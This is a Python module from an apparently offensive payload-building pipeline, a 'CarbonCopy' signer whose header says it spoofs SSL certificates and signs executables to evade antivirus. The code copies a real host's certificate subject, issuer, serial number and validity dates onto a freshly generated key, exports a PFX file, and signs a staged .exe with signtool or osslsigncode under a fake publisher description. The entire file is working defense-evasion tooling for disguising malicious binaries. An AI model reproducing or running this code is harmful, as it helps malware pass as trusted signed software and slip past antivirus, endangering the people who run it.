# Author : Paranoid Ninja
# Email  : paranoidninja@protonmail.com
# Description  : Spoofs SSL Certificates and Signs executables to evade Antivirus
import ssl
import shutil
import subprocess

from pydantic import AnyHttpUrl
from typing import ClassVar
from OpenSSL import crypto
from sys import platform

from pcr.lib.link import Link, Obj
from pcr.lib.artifact import Artifact


class CarbonCopy(Link):
    yaml_tag: ClassVar[str] = "!signer.CarbonCopy"
    url_description: AnyHttpUrl | Obj
    description: str | Obj
    timestamp_url: AnyHttpUrl | Obj
    host: str
    port: int

    def deduce_artifact(self) -> Artifact:
        return Artifact(
            type=self.input.output.type,
            os=self.input.output.os,
            arch=self.input.output.arch,
            path=str(self.config["main"].tmp / f"stage.{self.id}.exe"),
        )

    def process(self):
        self.output = self.deduce_artifact()
        # Fetching Details
        self.print("Loading public key of %s in Memory..." % self.host)
        ogcert = ssl.get_server_certificate((self.host, self.port))
        x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert)

        certDir = self.config["main"].tmp

        # Creating Fake Certificate
        CNCRT = certDir / (self.host + ".crt")
        CNKEY = certDir / (self.host + ".key")
        PFXFILE = certDir / (self.host + ".pfx")

        # Creating Keygen
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
        cert = crypto.X509()

        # Setting Cert details from loaded from the original Certificate
        self.print("Cloning Certificate Version")
        cert.set_version(x509.get_version())
        self.print("Cloning Certificate Serial Number")
        cert.set_serial_number(x509.get_serial_number())
        self.print("Cloning Certificate Subject")
        cert.set_subject(x509.get_subject())
        self.print("Cloning Certificate Issuer")
        cert.set_issuer(x509.get_issuer())
        self.print("Cloning Certificate Registration & Expiration Dates")
        cert.set_notBefore(x509.get_notBefore())
        cert.set_notAfter(x509.get_notAfter())
        cert.set_pubkey(k)
        self.print("Signing Keys")
        cert.sign(k, "sha256")

        self.print("Creating %s and %s" % (CNCRT, CNKEY))
        CNCRT.write_bytes(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        CNKEY.write_bytes(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
        self.print(
            "Clone process completed. Creating PFX file for signing executable..."
        )

        try:
            pfx = crypto.PKCS12()
        except AttributeError:
            pfx = crypto.PKCS12Type()

        pfx.set_privatekey(k)
        pfx.set_certificate(cert)
        pfxdata = pfx.export()

        PFXFILE.write_bytes(pfxdata)

        signee = str(self.input.output.path)
        signed = str(self.output.path)
        if platform == "win32":
            self.print("Platform is Windows OS...")
            self.print("Signing %s with signtool.exe..." % signed)
            shutil.copy(signee, signed)
            subprocess.check_call(
                [
                    "signtool.exe",
                    "sign",
                    "/v",
                    "/f",
                    str(PFXFILE),
                    "/d",
                    "MozDef Corp",
                    "/tr",
                    str(self.timestamp_url),
                    "/td",
                    "SHA256",
                    "/fd",
                    "SHA256",
                    signed,
                ]
            )

        else:
            self.print("Platform is Linux OS...")
            self.print("Signing %s with %s using osslsigncode..." % (signee, PFXFILE))
            args = (
                "osslsigncode",
                "sign",
                "-pkcs12",
                str(PFXFILE),
                "-n",
                self.description,
                "-i",
                str(self.url_description),
                "-ts",
                str(self.timestamp_url),
                "-in",
                signee,
                "-out",
                signed,
            )
            subprocess.check_call(args)

    def info(self):
        return "Sign a binary"
